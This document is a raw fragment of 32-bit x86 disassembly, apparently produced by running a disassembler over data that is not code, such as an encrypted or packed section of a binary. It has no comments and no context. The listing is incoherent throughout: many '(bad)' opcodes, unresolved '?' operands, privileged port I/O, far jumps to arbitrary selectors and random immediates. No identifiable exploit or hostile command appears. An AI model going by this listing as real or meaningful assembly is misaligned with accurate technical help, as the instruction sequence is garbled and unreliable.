  418d3a:	(bad)  
  418d3b:	out    0x77,al
  418d3d:	xor    DWORD PTR [edx-0x54],edx
  418d40:	mov    esi,0xc334d716
  418d45:	pop    ds
  418d46:	dec    edx
  418d47:	out    0x90,eax
  418d49:	cmp    BYTE PTR [ebp-0x73],cl
  418d4c:	mov    ?,WORD PTR [ecx+0x6f]
  418d4f:	outs   dx,DWORD PTR ds:[esi]
  418d50:	hlt    
  418d51:	xor    ch,bl
  418d53:	push   eax
  418d54:	add    eax,0xfaf14743
  418d59:	sbb    BYTE PTR [ecx],cl
  418d5b:	mov    ebp,0x9f6dc67d
  418d60:	sti    
  418d61:	dec    esi
  418d62:	test   eax,0xf2641b93
  418d67:	mov    ch,0xe8
  418d69:	sub    eax,0x5fd76534
  418d6e:	sbb    DWORD PTR [ebp+0x79cb4fa9],ebp
  418d74:	or     BYTE PTR [ecx+0x6a],dh
  418d77:	mov    edx,0xe2e20c4b
  418d7c:	sub    ah,BYTE PTR [edx-0xf9a3c53]
  418d82:	jge    0x418ddc
  418d84:	gs enter 0xab60,0x96
  418d89:	push   edx
  418d8a:	add    esp,eax
  418d8c:	(bad)  
  418d8d:	push   0x7b6237a8
  418d92:	adc    al,0x13
  418d94:	mov    ebx,0x922d4234
  418d99:	data16 sar BYTE PTR [eax+0x20],1
  418d9d:	mov    bl,0xb
  418d9f:	xor    edx,ecx
  418da1:	pop    ecx
  418da2:	scas   al,BYTE PTR es:[edi]
  418da3:	sbb    dh,BYTE PTR [edx+0x1]
  418da6:	leave  
  418da7:	leave  
  418da8:	loopne 0x418df5
  418daa:	repnz inc ebp
  418dac:	dec    BYTE PTR [esi-0x52831245]
  418db2:	xrelease mov DWORD PTR [ecx+0x639aea40],0xbccba782
  418dbd:	sbb    ah,dh
  418dbf:	sbb    ch,BYTE PTR [edi-0x2466875f]
  418dc5:	push   cs
  418dc6:	push   esi
  418dc8:	or     eax,0x92d102c6
  418dcd:	stc    
  418dce:	loop   0x418d79
  418dd0:	adc    dl,bh
  418dd2:	clc    
  418dd3:	sub    cl,dh
  418dd5:	in     eax,0x11
  418dd7:	pop    edi
  418dd8:	daa    
  418dd9:	(bad)  
  418dda:	shr    bl,1
  418ddc:	dec    edi
  418ddd:	push   ebx
  418dde:	arpl   WORD PTR [ecx+0x71],si
  418de1:	add    DWORD PTR [ebx-0x1a],eax
  418de4:	cmp    BYTE PTR cs:[ebx],bl
  418de7:	enter  0xb0bb,0xad
  418deb:	sub    DWORD PTR [ebx+0x35],ebx
  418dee:	add    bl,BYTE PTR [ebp-0x61]
  418df1:	lds    edx,FWORD PTR [eax-0x8]
  418df4:	int3   
  418df5:	sti    
  418df6:	je     0x418de2
  418df8:	pop    esi
  418df9:	aad    0x8e
  418dfb:	es (bad) 
  418dfd:	arpl   WORD PTR [ebp-0x5a34556f],sp
  418e03:	mov    ecx,0xfda1a6f1
  418e08:	stc    
  418e09:	mov    al,ds:0xf5f8df19
  418e0e:	ficomp WORD PTR [ebp+0x7344bfe2]
  418e14:	and    DWORD PTR [edx+0x2b1f4d2e],0xe969bb2f
  418e1e:	stos   DWORD PTR es:[edi],eax
  418e1f:	repnz in al,dx
  418e21:	inc    esp
  418e22:	addr16 and esi,eax
  418e25:	stos   BYTE PTR es:[edi],al
  418e26:	inc    edx
  418e27:	jle    0x418ddb
  418e29:	sti    
  418e2a:	mov    ebp,0x9c11683a
  418e2f:	pop    eax
  418e30:	sbb    eax,0x18069cee
  418e35:	add    dl,BYTE PTR [ecx+0x46]
  418e38:	mov    edi,DWORD PTR [eax+ebx*4-0x3e]
  418e3c:	int3   
  418e3d:	cwde   
  418e3e:	sar    dh,1
  418e40:	adc    DWORD PTR [esi+0x510a581b],ebp
  418e46:	pop    esi
  418e47:	sub    BYTE PTR [edx+0x46],dh
  418e4a:	ins    DWORD PTR es:[edi],dx
  418e4b:	into   
  418e4c:	push   ss
  418e4d:	adc    bh,0x27
  418e50:	js     0x418e57
  418e52:	cld    
  418e53:	and    al,0x97
  418e55:	adc    al,0xe9
  418e57:	fidiv  WORD PTR [ebp+0x4e]
  418e5a:	jnp    0x418ed4
  418e5c:	jmp    0xa0977797
  418e61:	sbb    ah,BYTE PTR [ebx-0x1b]
  418e64:	lods   al,BYTE PTR ds:[esi]
  418e65:	js     0x418e22
  418e67:	inc    ebx
  418e68:	or     ebx,0x32
  418e6b:	pop    ebp
  418e6c:	sub    BYTE PTR [bx+di-0x7678],al
  418e71:	inc    eax
  418e72:	mov    bl,0x78
  418e74:	pop    ecx
  418e75:	bound  edx,QWORD PTR [esi+0x61]
  418e78:	imul   eax,DWORD PTR [ecx],0xfffffff2
  418e7b:	inc    ebp
  418e7c:	push   esi
  418e7d:	and    DWORD PTR [edx],edi
  418e7f:	hlt    
  418e80:	mov    BYTE PTR ds:0xa042bf6,bh
  418e86:	fild   WORD PTR [edi-0x69cfd093]
  418e8c:	mov    esi,0x85d92785
  418e91:	nop
  418e92:	cmp    al,0xb8
  418e94:	xor    al,0x6
  418e96:	xchg   ebx,eax
  418e97:	sbb    eax,0xeb3940d2
  418e9c:	int3   
  418e9d:	fdiv   st(7),st
  418e9f:	sbb    BYTE PTR [edx+ebx*4+0x26e72850],bl
  418ea6:	push   esi
  418ea7:	sar    ebx,1
  418ea9:	xor    bl,dl
  418eab:	ins    BYTE PTR es:[edi],dx
  418eac:	iret   
  418ead:	jne    0x418e32
  418eaf:	push   edx
  418eb1:	test   BYTE PTR [ecx-0x5a],ch
  418eb4:	ficomp DWORD PTR [ebx-0x3fb4e932]
  418eba:	call   0x36ad28a1
  418ebf:	add    edx,DWORD PTR [ecx]
  418ec1:	xlat   BYTE PTR ds:[ebx]
  418ec2:	sbb    BYTE PTR [ecx],dh
  418ec4:	stc    
  418ec5:	das    
  418ec6:	sub    al,0x6c
  418ec8:	(bad)  
  418ec9:	add    eax,0x4cba85f3
  418ece:	mov    esp,0xa72c3b8d
  418ed3:	out    dx,al
  418ed4:	xchg   BYTE PTR [esp+esi*2+0x78ac714a],cl
  418edb:	dec    ebx
  418edc:	in     al,0xde
  418ede:	add    ah,ch
  418ee0:	rcl    esi,0x3
  418ee3:	je     0x418f60
  418ee5:	pop    esp
  418ee6:	jmp    0x418eb5
  418ee8:	pop    edx
  418ee9:	cld    
  418eea:	mov    esp,0x1a90cd56
  418eef:	push   0x8b618477
  418ef4:	or     dh,al
  418ef6:	js     0x418eaa
  418ef8:	mov    ecx,0x79ece903
  418efd:	adc    ebx,edx
  418eff:	int3   
  418f00:	pop    esp
  418f01:	int    0x4c
  418f03:	je     0x418f75
  418f05:	lods   eax,DWORD PTR ds:[esi]
  418f06:	adc    esi,DWORD PTR [ebx]
  418f08:	stos   DWORD PTR es:[edi],eax
  418f09:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  418f0a:	cdq    
  418f0b:	push   ebx
  418f0c:	mov    ecx,0xa69d019a
  418f11:	mov    cs,esp
  418f13:	fstp   TBYTE PTR [eax+0x66]
  418f16:	inc    ebx
  418f17:	mov    bl,0xa8
  418f19:	jbe    0x418f27
  418f1b:	aam    0xb
  418f1d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  418f1e:	imul   ebx,DWORD PTR [eax+0x2a],0xffffffae
  418f22:	pushf  
  418f23:	xor    cl,BYTE PTR [edi+edx*1]
  418f26:	mov    bh,0x5a
  418f28:	cld    
  418f29:	pop    ebp
  418f2a:	cdq    
  418f2b:	adc    cl,dl
  418f2d:	add    al,0xb1
  418f2f:	cmp    BYTE PTR [ebp+edx*2-0x1a],cl
  418f33:	(bad)  
  418f34:	sti    
  418f35:	ficom  DWORD PTR [edx-0x60]
  418f38:	xor    edi,DWORD PTR [ebx+esi*4-0x594bce7]
  418f3f:	mov    edi,0xa662f7a8
  418f44:	test   DWORD PTR [edx+0x1fe50147],0xd1c523a1
  418f4e:	(bad)  
  418f4f:	ror    BYTE PTR [ecx-0x4c],0x89
  418f53:	xor    DWORD PTR [edx-0x7d],ecx
  418f56:	inc    esi
  418f57:	popa   
  418f58:	jecxz  0x418f39
  418f5a:	test   ch,0xb2
  418f5d:	rcl    DWORD PTR ds:0x80be1fe3,cl
  418f63:	call   0xe0d58ca7
  418f68:	push   esp
  418f69:	xlat   BYTE PTR ds:[ebx]
  418f6a:	mov    dl,0x74
  418f6c:	shr    eax,cl
  418f6e:	jmp    0xf3ba67fa
  418f73:	cmp    cl,BYTE PTR [edx-0x3e83c22e]
  418f79:	sbb    BYTE PTR [ebp+0x68],0x78
  418f7d:	je     0x418f0e
  418f7f:	in     al,dx
  418f80:	cmp    ah,bl
  418f82:	out    dx,eax
  418f83:	xor    al,0xe
  418f85:	pop    eax
  418f86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418f87:	and    al,0x86
  418f89:	pop    esi
  418f8a:	cmp    cl,0x8
  418f8d:	aas    
  418f8e:	xchg   ebp,eax
  418f8f:	mov    ebx,0xc79c2c9a
  418f94:	push   edi
  418f95:	jge    0x418f73
  418f97:	adc    esi,esi
  418f99:	test   esp,esp
  418f9b:	jne    0x418f1d
  418f9d:	adc    al,0xd7
  418f9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  418fa0:	ret    0x3b8d
  418fa3:	push   ds
  418fa4:	data16 adc ch,BYTE PTR [edx+edi*1]
  418fa8:	pop    edx
  418fa9:	(bad)  
  418faa:	popa   
  418fab:	xor    al,0xd1
  418fad:	ds pop ecx
  418faf:	mov    esp,0x5a90f7b
  418fb4:	mov    esp,0x6453d476
  418fb9:	hlt    
  418fba:	jae    0x41901d
  418fbc:	xchg   esp,eax
  418fbd:	rcl    dh,cl
  418fbf:	mov    BYTE PTR ds:0xf3c60f81,0x52
  418fc6:	xchg   ebx,eax
  418fc7:	and    DWORD PTR [eax],ebp
  418fc9:	adc    BYTE PTR [ebx+esi*1],ah
  418fcc:	nop
  418fcd:	ret    0xd274
  418fd0:	sub    esp,DWORD PTR [ecx-0x6ffd38c4]
  418fd6:	dec    eax
  418fd7:	and    BYTE PTR ds:0x46fde9d4,ah
  418fdd:	cmc    
  418fde:	push   ebp
  418fdf:	repz mov cl,BYTE PTR [ebp+edx*1+0x2e688e20]
  418fe7:	xor    BYTE PTR [ebx-0x79e0ffbd],ch
  418fed:	in     eax,0x2e
  418fef:	aam    0xcf
  418ff1:	sbb    BYTE PTR [edi+0x3d353f84],cl
  418ff7:	pusha  
  418ff8:	shr    esp,0x75
  418ffb:	rcl    eax,0x6d
  418ffe:	test   BYTE PTR [ecx-0x782a6a77],dl
  419004:	sbb    DWORD PTR [eax],0x44
  419007:	inc    ecx
  419008:	mov    ds:0xf10eac47,eax
  41900d:	fdiv   st(7),st
  41900f:	inc    eax
  419010:	sub    al,0xf5
  419012:	jge    0x41904b
  419014:	push   ecx
  419015:	ins    BYTE PTR es:[edi],dx
  419016:	cmp    esi,ebp
  419018:	and    ebp,DWORD PTR [ecx+edi*8-0x1c]
  41901c:	das    
  41901d:	or     dh,dl
  41901f:	loope  0x419014
  419021:	jne    0x418fc0
  419023:	sub    al,0x0
  419025:	and    eax,0xcb86a954
  41902a:	jmp    0x41907f
  41902c:	pop    ebp
  41902d:	(bad)  [esp+esi*4-0x659050b3]
  419034:	mov    ah,0xb9
  419036:	loope  0x4190ab
  419038:	into   
  419039:	in     eax,0xe8
  41903b:	inc    esp
  41903c:	pop    esp
  41903d:	xor    dh,BYTE PTR [ecx+0x68]
  419040:	(bad)  
  419041:	mov    esi,0x390de612
  419046:	ss inc edi
  419048:	pop    ds
  419049:	das    
  41904a:	lds    eax,FWORD PTR [esi-0x2f8fae19]
  419050:	out    0xc2,eax
  419052:	pusha  
  419053:	mov    esp,ecx
  419055:	xlat   BYTE PTR ds:[ebx]
  419056:	xchg   ebx,eax
  419057:	cmp    dh,al
  419059:	push   cs
  41905a:	mov    cs,WORD PTR [esp+eax*4-0x58]
  41905e:	xchg   DWORD PTR [ebx+0x33],edx
  419061:	mov    edx,0xa147c0de
  419066:	jne    0x4190d4
  419068:	sbb    BYTE PTR [ecx-0x4e],dh
  41906b:	xor    eax,0x65dc583f
  419070:	or     ah,al
  419072:	sub    BYTE PTR [ebp-0x5],ch
  419075:	push   esp
  419076:	jno    0x419086
  419078:	adc    bh,BYTE PTR [edi]
  41907a:	push   DWORD PTR [ebx-0x31]
  41907d:	jae    0xe24e70be
  419083:	rol    DWORD PTR [edx],0xdd
  419086:	popa   
  419087:	popa   
  419088:	not    DWORD PTR [esi+0x37335542]
  41908e:	cmp    bl,dh
  419090:	jecxz  0x41909f
  419092:	stos   BYTE PTR es:[edi],al
  419093:	add    eax,0x34ce864a
  419098:	sti    
  419099:	xor    al,0x1e
  41909b:	out    dx,al
  41909c:	jmp    0x9f74:0x371ea814
  4190a3:	ins    BYTE PTR es:[edi],dx
  4190a4:	push   edi
  4190a5:	repnz test al,0x39
  4190a8:	retf   
  4190a9:	mov    ecx,0x8bfcf940
  4190ae:	jl     0x419037
  4190b0:	push   es
  4190b1:	pop    esp
  4190b2:	push   0xffffffef
  4190b4:	clc    
  4190b5:	pushf  
  4190b6:	mov    edi,0x7da84741
  4190bb:	sbb    ebp,eax
  4190bd:	cmp    esi,DWORD PTR ds:[ecx]
  4190c0:	out    dx,al
  4190c1:	outs   dx,BYTE PTR ds:[esi]
  4190c2:	adc    BYTE PTR [edi+0xe],dl
  4190c5:	int    0x14
  4190c7:	mov    bh,0xdb
  4190c9:	adc    al,0xe3
  4190cb:	shl    ah,1
  4190cd:	imul   eax,DWORD PTR [edx-0x2c],0xffffffd5
  4190d1:	aad    0x4a
  4190d3:	pop    edi
  4190d4:	mov    ecx,0x88aa833a
  4190d9:	and    al,0xf6
  4190db:	and    eax,0xeac0599c
  4190e0:	daa    
  4190e1:	fild   WORD PTR cs:0x614b57b
  4190e8:	push   cs
  4190e9:	aam    0xea
  4190eb:	jmp    0x34cb:0xa1a1122c
  4190f2:	in     eax,0xd7
  4190f4:	addr16 das 
  4190f6:	lds    eax,FWORD PTR [eax*4+0x7b48ab6]
  4190fd:	and    DWORD PTR [ecx+ebp*2+0x10],ebp
  419101:	sub    BYTE PTR [esi],0x2c
  419104:	pusha  
  419105:	pop    ebp
  419106:	stc    
  419107:	push   edx
  419108:	(bad)  
  419109:	push   ds
  41910a:	aaa    
  41910b:	rcr    BYTE PTR [esi],cl
  41910d:	push   0xffffffc3
  41910f:	and    BYTE PTR [eax+0x1cd14f7d],bh
  419115:	jmp    0x5bca:0x7d8b8b6f
  41911c:	mov    cs:0xb7b0a21d,al
  419122:	fwait
  419123:	dec    ebx
  419124:	dec    eax
  419125:	fdivr  st(0),st
  419127:	xor    DWORD PTR [esi+0x5639e925],eax
  41912d:	xchg   ebx,eax
  41912e:	inc    ebp
  41912f:	imul   ecx,DWORD PTR [ebx+0x19175f15],0x57
  419136:	mov    ch,0x6c
  419138:	jp     0x419139
  41913a:	arpl   WORD PTR ds:0x43729168,di
  419140:	mov    dh,0xeb
  419142:	dec    ebp
  419143:	hlt    
  419144:	mov    ebx,0xc914899b
  419149:	pusha  
  41914a:	mov    ?,esi
  41914c:	adc    cl,BYTE PTR [edx+0x9b960e5]
  419152:	sar    DWORD PTR [eiz*4-0x3b548701],cl
  419159:	add    al,0x7b
  41915b:	inc    ebx
  41915c:	xchg   edi,eax
  41915d:	xchg   edi,eax
  41915e:	mov    ds:0xb1445f48,al
  419163:	jmp    0xfc5b:0x5e3a819a
  41916a:	scas   al,BYTE PTR es:[edi]
  41916b:	pop    esi
  41916c:	push   ebp
  41916d:	ja     0x419125
  41916f:	or     DWORD PTR [esi-0x582557c7],esp
  419175:	(bad)  
  419176:	fimul  WORD PTR [ebp-0x70c29a1d]
  41917c:	mov    esp,0x663b2fac
  419181:	ins    BYTE PTR es:[edi],dx
  419182:	dec    edx
  419183:	pop    eax
  419184:	add    dh,al
  419186:	imul   ebp,DWORD PTR [esp+esi*1+0x249f78e],0x2042e283
  419191:	shl    DWORD PTR [edi-0x79a34a5c],0xd5
  419198:	sar    BYTE PTR ds:0xef948edc,cl
  41919e:	repz sub DWORD PTR [ebx+0x50],esi
  4191a2:	outs   dx,DWORD PTR ds:[esi]
  4191a3:	lods   eax,DWORD PTR ds:[esi]
  4191a4:	add    edi,ebp
  4191a6:	es push ebx
  4191a8:	cmp    al,0xff
  4191aa:	dec    edx
  4191ab:	fisubr DWORD PTR [edx+0x5d5c6baa]
  4191b1:	or     al,0xc1
  4191b3:	fbstp  TBYTE PTR [ecx]
  4191b5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4191b6:	or     eax,0xece91761
  4191bb:	mov    cs,WORD PTR [esi-0x3072a770]
  4191c1:	adc    DWORD PTR cs:[edi+0x43d7d8e1],edi
  4191c8:	mov    edx,DWORD PTR [esi+0x78]
  4191cb:	add    esp,ebp
  4191cd:	adc    DWORD PTR [edi-0x198fb224],0x6383d4ae
  4191d7:	inc    ebx
  4191d8:	cmp    BYTE PTR [ebx+0x41],0xe7
  4191dc:	xor    DWORD PTR [eax-0x7e08984d],esp
  4191e2:	cmp    eax,0x3c45f6b9
  4191e7:	in     eax,0x8a
  4191e9:	add    BYTE PTR [ebx],al
  4191eb:	frstor [eax]
  4191ed:	push   ds
  4191ee:	cdq    
  4191ef:	pushf  
  4191f0:	inc    ebp
  4191f1:	jmp    0x90f4:0x976e6dbf
  4191f8:	mov    ds:0xace06c6,eax
  4191fd:	mov    ds:0x4e9b2742,al
  419202:	add    esp,DWORD PTR [esi+0x192bd50a]
  419208:	pusha  
  419209:	sub    eax,0x89ee247a
  41920e:	int    0xb2
  419210:	les    ebx,FWORD PTR [edi+0x3cde4800]
  419216:	imul   eax,DWORD PTR [ebx-0xd],0x13
  41921a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41921b:	imul   ebx,DWORD PTR [ecx-0x76],0xffffffe8
  41921f:	pop    es
  419220:	mov    cl,0x97
  419222:	popf   
  419223:	xchg   BYTE PTR [edi+0x27],al
  419226:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  419227:	and    DWORD PTR [edx],edx
  419229:	popf   
  41922a:	daa    
  41922b:	fldenv [eax]
  41922d:	mov    bh,0x83
  41922f:	pop    eax
  419230:	(bad)  
  419232:	sbb    al,cl
  419234:	dec    ebp
  419235:	mov    dh,0x53
  419237:	js     0x41923a
  419239:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41923a:	dec    esp
  41923b:	sub    bl,BYTE PTR [eax+ebp*8+0x3592f462]
  419242:	jecxz  0x419297
  419244:	xchg   esi,eax
  419245:	stos   BYTE PTR es:[edi],al
  419246:	and    eax,0xfbad42c5
  41924b:	fld    st(5)
  41924d:	sbb    BYTE PTR [esi+0x6],0x32
  419251:	pushf  
  419252:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  419253:	pop    ebp
  419254:	mov    ebp,0xd2ccd0c
  419259:	(bad)  
  41925a:	sahf   
  41925b:	mov    dh,0xc3
  41925d:	xor    DWORD PTR [edx],edi
  41925f:	je     0x419265
  419261:	mov    ah,0x76
  419263:	addr16 mov cl,0xa2
  419266:	inc    esi
  419267:	cmp    DWORD PTR [ecx+edx*2],edi
  41926a:	or     eax,ebp
  41926c:	and    esi,edx
  41926e:	mov    dl,0xa1
  419270:	jg     0x419256
  419272:	lods   eax,DWORD PTR ds:[esi]
  419273:	test   cl,bh
  419275:	pop    ss
  419276:	mov    cl,0x47
  419278:	xor    al,0xf2
  41927a:	cmp    al,0xe5
  41927c:	icebp  
  41927d:	mov    bh,0x71
  41927f:	sub    BYTE PTR [edi-0x6aa5aa67],al
  419285:	cmp    DWORD PTR [ebx+0x5b],esp
  419288:	mov    WORD PTR [ecx],?
  41928a:	stos   BYTE PTR es:[edi],al
  41928b:	in     al,dx
  41928c:	sub    al,0xb7
  41928e:	push   es
  41928f:	hlt    
  419290:	aas    
  419291:	mov    ds:0x77c161e0,eax
  419296:	loopne 0x4192d5
  419298:	adc    al,0x56
  41929a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41929b:	fidiv  WORD PTR [eax-0x28a9db30]
  4192a1:	out    0xc4,eax
  4192a3:	shl    DWORD PTR [esi],1
  4192a5:	inc    esi
  4192a6:	sub    eax,0xa552ef18
  4192ab:	fwait
  4192ac:	inc    edi
  4192ad:	pop    ds
  4192ae:	ret    0xe2d4
  4192b1:	inc    ebx
  4192b2:	popa   
  4192b3:	lea    edi,[ebx+ebp*8-0x39]
  4192b7:	mov    ds,ebx
  4192b9:	or     al,0xdc
  4192bb:	inc    ebp
  4192bc:	jb     0x4192f6
  4192be:	shl    BYTE PTR [edx-0x69b1811a],cl
  4192c4:	dec    ebx
  4192c5:	imul   esp,DWORD PTR [ebp-0x6c],0xf597d922
  4192cc:	xlat   BYTE PTR ds:[ebx]
  4192cd:	and    BYTE PTR [edi-0x6bf1075],bl
  4192d3:	ret    
  4192d4:	mov    ch,0x2
  4192d6:	pop    edi
  4192d7:	cwde   
  4192d8:	push   ds
  4192d9:	sub    DWORD PTR [ebx-0x2ecf0448],ebx
  4192df:	pop    esp
  4192e0:	(bad)  
  4192e1:	in     eax,0x37
  4192e3:	loopne 0x41926d
  4192e5:	imul   eax,DWORD PTR [edx+edi*2+0x5f666c36],0x19b04950
  4192f0:	repnz mov dl,0x22
  4192f3:	(bad)  
  4192f5:	push   ecx
  4192f6:	sub    edx,DWORD PTR [ecx+0x1c]
  4192f9:	and    al,0x3
  4192fb:	xchg   ecx,eax
  4192fc:	adc    DWORD PTR [edi+0x6823e7de],ecx
  419302:	outs   dx,BYTE PTR ds:[esi]
  419303:	loop   0x41936c
  419305:	pop    ss
  419306:	es xor eax,0xdac9247a
  41930c:	pop    es
  41930d:	xchg   edx,eax
  41930e:	bound  ebx,QWORD PTR [edi-0x14]
  419311:	mov    eax,ds:0x8844826f
  419316:	lock jne 0x41934c
  419319:	cs out dx,al
  41931b:	add    eax,eax
  41931d:	xor    BYTE PTR [ebx],cl
  41931f:	pop    eax
  419320:	loope  0x4192f9
  419322:	mov    al,ds:0xac474d84
  419327:	xor    edi,DWORD PTR gs:[esi]
  41932a:	(bad)  
  41932b:	xor    DWORD PTR [ebx],ebp
  41932d:	sbb    al,0x49
  41932f:	pop    ds
  419330:	mov    ds:0x6a145a7,eax
  419335:	arpl   di,ax
  419337:	push   0xd9f044c5
  41933c:	push   ebp
  41933d:	jo     0x4193a3
  41933f:	dec    ebx
  419340:	push   ebx
  419341:	inc    esp
  419342:	or     eax,0x52a7dc23
  419347:	aam    0xa6
  419349:	sub    DWORD PTR [esp+0x44dd001b],edx
  419350:	stos   DWORD PTR es:[edi],eax
  419351:	es ret 0x8260
  419355:	int3   
  419356:	(bad)  
  419357:	ds mov esp,0xd11abaf3
  41935d:	push   ebx
  41935e:	xor    DWORD PTR [ebp+0x2b3c3781],esi
  419364:	cs pop ebp
  419366:	mov    esi,0xb0d0f94d
  41936b:	(bad)  
  41936c:	cli    
  41936d:	push   ebx
  41936e:	mov    DWORD PTR [ecx-0x3dbf4aa9],0xe90af382
  419378:	dec    esi
  419379:	imul   DWORD PTR [eax+0x2c481482]
  41937f:	fwait
  419380:	clc    
  419381:	add    BYTE PTR [esi-0x4],ah
  419384:	sbb    al,BYTE PTR [ebp-0x33]
  419387:	ret    0x7f78
  41938a:	bound  edi,QWORD PTR [edx+0x78]
  41938d:	push   edi
  41938e:	xchg   ebx,eax
  41938f:	mov    ds:0x15de43d2,eax
  419394:	adc    ebp,DWORD PTR [eax+0x1c0d0b5]
  41939a:	ror    BYTE PTR [ebx-0x4713652b],1
  4193a0:	dec    eax
  4193a1:	stc    
  4193a2:	(bad)  
  4193a3:	cmp    eax,0x6254ec4d
  4193a8:	jp     0x419369
  4193aa:	pop    ebp
  4193ab:	fnstenv [edi]
  4193ad:	scas   eax,DWORD PTR es:[edi]
  4193ae:	cmp    ch,BYTE PTR [eax-0x6d099ea7]
  4193b4:	std    
  4193b5:	push   ebp
  4193b6:	aas    
  4193b7:	jmp    0x91c3:0xc65ca717
  4193be:	std    
  4193bf:	push   ds
  4193c0:	(bad)  
  4193c1:	leave  
  4193c2:	push   0xffffffcc
  4193c4:	and    BYTE PTR [esi],0xea
  4193c7:	xor    DWORD PTR [edi-0x56],edx
  4193ca:	pop    edx
  4193cb:	adc    DWORD PTR [edx],edi
  4193cd:	(bad)  [esi*8-0x6abbdd70]
  4193d4:	out    dx,eax
  4193d5:	fs int 0xe0
  4193d8:	not    edx
  4193da:	iret   
  4193db:	xchg   ebx,eax
  4193dc:	cdq    
  4193dd:	clc    
  4193de:	aam    0xa
  4193e0:	fidiv  DWORD PTR [edx]
  4193e2:	push   0x583e14a8
  4193e7:	mov    edi,0x90495f6
  4193ec:	out    0x44,eax
  4193ee:	mul    ah
  4193f0:	(bad)  
  4193f1:	aad    0xc1
  4193f3:	pusha  
  4193f4:	out    dx,eax
  4193f5:	dec    edx
  4193f6:	imul   ebx,DWORD PTR [esi+ebp*1],0x236072a9
  4193fd:	inc    esi
  4193fe:	test   eax,0x289dd334
  419403:	in     eax,0xdf
  419405:	add    eax,0x2e28b108
  41940a:	or     ah,ah
  41940c:	out    dx,al
  41940d:	jbe    0x4193d4
  41940f:	push   es
  419410:	adc    eax,0xdae513cb
  419415:	ins    DWORD PTR es:[edi],dx
  419416:	push   edx
  419417:	add    edx,edi
  419419:	xchg   edi,eax
  41941a:	or     al,0x74
  41941c:	inc    eax
  41941d:	in     al,dx
  41941e:	jg     0x419411
  419420:	mov    cs,WORD PTR [ebx-0x32c3bc8f]
  419426:	ss das 
  419428:	popa   
  419429:	iret   
  41942a:	lods   al,BYTE PTR ds:[esi]
  41942b:	stc    
  41942c:	mov    esi,0x7bae6153
  419431:	outs   dx,DWORD PTR ds:[esi]
  419432:	gs mov edx,0xc3f8dfb0
  419438:	adc    BYTE PTR [edi-0x147686bf],dh
  41943e:	mov    dl,0x24
  419440:	stc    
  419441:	and    ebx,DWORD PTR [eax+0x1a]
  419444:	and    ecx,DWORD PTR [esi]
  419446:	dec    esi
  419447:	enter  0xbe20,0xaf
  41944b:	scas   eax,DWORD PTR es:[edi]
  41944c:	mov    DWORD PTR [ebx+0xe22616f],edx
  419452:	call   0x31ba:0x65933fd
  419459:	jl     0x419420
  41945b:	aad    0x8d
  41945d:	xchg   BYTE PTR [edi],dh
  41945f:	push   cs
  419460:	xor    eax,0x5a572975
  419465:	fwait
  419466:	adc    esp,ebp
  419468:	int    0x2a
  41946a:	cs sti 
  41946c:	adc    edi,esi
  41946e:	imul   ebx,DWORD PTR [edi-0x13],0xffffffeb
  419472:	mov    cl,0x24
  419474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  419475:	and    al,0x76
  419477:	inc    BYTE PTR fs:[eax+ebx*1-0x5440791d]
  41947f:	xor    BYTE PTR [eax-0x58],ah
  419482:	mov    dh,bl
  419484:	icebp  
  419485:	xchg   ebp,eax
  419486:	mov    ecx,0x2a044e68
  41948b:	sbb    al,0x90
  41948d:	iret   
  41948e:	pop    es
  41948f:	cli    
  419490:	add    al,0x54
  419492:	mov    edx,0x5fc95c5e
  419497:	bound  ebx,QWORD PTR [esi+0x61]
  41949a:	mov    bl,0xc5
  41949c:	idiv   DWORD PTR [eax-0x48]
  41949f:	push   ebp
  4194a0:	mov    BYTE PTR [eax+0x2d],dl
  4194a3:	jge    0x4194e6
  4194a5:	scas   al,BYTE PTR es:[edi]
  4194a6:	arpl   bx,bp
  4194a8:	mov    esi,DWORD PTR [esi-0x18]
  4194ab:	fidivr DWORD PTR [ebx+0x70]
  4194ae:	cli    
  4194af:	pop    esp
  4194b0:	nop
  4194b1:	lahf   
  4194b2:	cmp    esp,DWORD PTR [ebp-0x2ba94fbb]
  4194b8:	xchg   ebx,eax
  4194b9:	mov    esi,0xd4937161
  4194be:	mov    dl,0x99
  4194c0:	xchg   BYTE PTR [esi],al
  4194c2:	dec    esp
  4194c3:	sbb    edi,DWORD PTR [ecx+ebx*2]
  4194c6:	cmp    DWORD PTR [esi+0x1061c4fa],ebp
  4194cc:	iret   
  4194cd:	fadd   QWORD PTR [ebx]
  4194cf:	xchg   edi,eax
  4194d0:	add    al,0x1a
  4194d2:	mov    ?,WORD PTR [edx+eax*8]
  4194d5:	rcl    DWORD PTR [ebx+eax*2+0x2175510e],0xde
  4194dd:	cmp    BYTE PTR [eax],cl
  4194df:	xchg   edi,eax
  4194e0:	jecxz  0x4194d2
  4194e2:	enter  0x9351,0x98
  4194e6:	push   ecx
  4194e7:	xchg   cl,dh
  4194e9:	adc    DWORD PTR [edi-0x5d],esi
  4194ec:	fst    DWORD PTR [ebp-0x20563015]
  4194f2:	out    0x56,eax
  4194f4:	repz ficom DWORD PTR [ecx]
  4194f7:	cld    
  4194f8:	adc    ecx,ebp
  4194fa:	xchg   ebx,eax
  4194fb:	enter  0xaa8c,0x76
  4194ff:	mov    dl,0x4e
  419501:	cmp    esp,DWORD PTR [eax]
  419503:	popf   
  419504:	ss mov dl,0x47
  419507:	mov    ch,0x7e
  419509:	cmp    BYTE PTR [ebp+0x0],dh
  41950c:	icebp  
  41950d:	mov    dh,0x36
  41950f:	(bad)  
  419510:	imul   edi,DWORD PTR ds:0xe828435e,0x1d
  419517:	int3   
  419518:	xor    ecx,DWORD PTR [ecx-0x33]
  41951b:	in     eax,0x6a
  41951d:	jecxz  0x419518
  41951f:	loop   0x419589
  419521:	jecxz  0x41957c
  419523:	cmc    
  419524:	pop    edx
  419525:	rol    ebp,0x5d
  419528:	and    bh,0xf9
  41952b:	(bad)  
  41952c:	sbb    DWORD PTR [ebx],esp
  41952e:	mov    BYTE PTR [eiz*8+0x2d2ed93],cl
